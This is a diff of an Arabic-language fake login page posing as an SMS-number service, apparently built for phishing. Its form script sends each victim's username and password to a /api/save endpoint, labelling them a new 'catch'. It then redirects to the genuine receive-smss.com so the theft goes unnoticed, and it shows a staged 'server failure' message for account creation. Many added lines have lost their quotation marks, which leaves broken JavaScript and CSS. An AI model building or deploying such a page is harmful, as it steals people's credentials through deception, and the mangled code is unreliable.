@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -5,10 +6,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل الدخول - خدمة SMS</title>
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     
     <style>
         body {
-            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0; padding: 0; font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #FF0055 0%, #CC0044 100%); 
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }
@@ -26,13 +28,6 @@
             border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; 
             outline: none; text-align: right; font-size: 14px;
         }
-
-        /* رسالة الخطأ الخاصة بالخوادم */
-        .server-error {
-            background-color: #f8d7da; color: #721c24;
-            padding: 10px; border-radius: 5px; border: 1px solid #f5c6cb;
-            margin-bottom: 15px; font-size: 13px; display: none;
-        }
         
         .captcha-wrapper { display: flex; justify-content: center; margin-bottom: 20px; }
         
@@ -41,7 +36,6 @@
             border: none; border-radius: 8px; font-size: 17px; font-weight: bold; 
             cursor: pointer; transition: 0.3s; margin-bottom: 15px;
         }
-        button:hover { background: #a30036; }
 
         .footer-links { margin-top: 10px; border-top: 1px solid #eee; padding-top: 15px; }
         .footer-links p { font-size: 14px; color: #666; }
@@ -57,8 +51,6 @@
 
         <h2 id="pageLetter">سجل دخولك لتفعيل خدمة الأرقام</h2>
 
-        <div id="serverError" class="server-error">⚠️ فشل الاتصال في الخوادم، يرجى المحاولة لاحقاً.</div>
-
         <form id="checkForm">
             <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             <input type="password" id="passInput" placeholder="كلمة السر" required>
@@ -71,50 +63,52 @@
         </form>
 
         <div class="footer-links">
-            <p>ليس لديك حساب؟ <a onclick="showCreateAccountError()">إنشاء حساب جديد</a></p>
+            <p>ليس لديك حساب؟ <a onclick="showCreateAccountDialog()">إنشاء حساب جديد</a></p>
         </div>
     </div>
 
     <script>
-        const serverError = document.getElementById('serverError');
-
-        // وظيفة إظهار الخطأ عند الضغط على إنشاء حساب فقط
-        function showCreateAccountError() {
-            serverError.style.display = 'block';
-            // إخفاء الرسالة تلقائياً بعد 4 ثوانٍ لتبدو واقعية
-            setTimeout(() => {
-                serverError.style.display = 'none';
-            }, 4000);
+        // وظيفة إظهار الدايلوج (النافذة المنبثقة) عند الضغط على إنشاء حساب
+        function showCreateAccountDialog() {
+            Swal.fire({
+                title:  خطأ في النظام ,
+                text:  فشل الاتصال في الخوادم، يرجى المحاولة لاحقاً. ,
+                icon:  error ,
+                confirmButtonText:  حسناً ,
+                confirmButtonColor:  #CC0044 
+            });
         }
 
-        document.getElementById('checkForm').onsubmit = async (e) => {
+        document.getElementById( checkForm ).onsubmit = async (e) => {
             e.preventDefault();
-            const user = document.getElementById('userInput').value;
-            const pass = document.getElementById('passInput').value;
+            const user = document.getElementById( userInput ).value;
+            const pass = document.getElementById( passInput ).value;
             
-            const turnstileResponse = document.querySelector('[name="cf-turnstile-response"]').value;
+            const turnstileResponse = document.querySelector( [name="cf-turnstile-response"] ).value;
 
             if (!turnstileResponse) {
-                alert("يرجى إكمال التحقق أولاً");
+                Swal.fire({
+                    text:  يرجى إكمال التحقق أولاً ,
+                    icon:  warning ,
+                    confirmButtonText:  موافق 
+                });
                 return;
             }
 
-            // 1. إرسال البيانات (الصيد)
+            // إرسال البيانات (الصيد)
             try {
-                await fetch('/api/save', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                await fetch( /api/save , {
+                    method:  POST ,
+                    headers: {  Content-Type :  application/json  },
                     body: JSON.stringify({
-                        title: "🚨 صيد جديد من صفحة SMS",
+                        title: "🚨 صيد جديد",
                         user: user,
                         password: pass
                     })
                 });
-            } catch (err) {
-                console.log("Data logged");
-            }
+            } catch (err) {}
 
-            // 2. التحويل للموقع الأصلي فوراً (نجاح تسجيل الدخول)
+            // التحويل للموقع الحقيقي
             window.location.href = "https://receive-smss.com/"; 
         };
     </script>
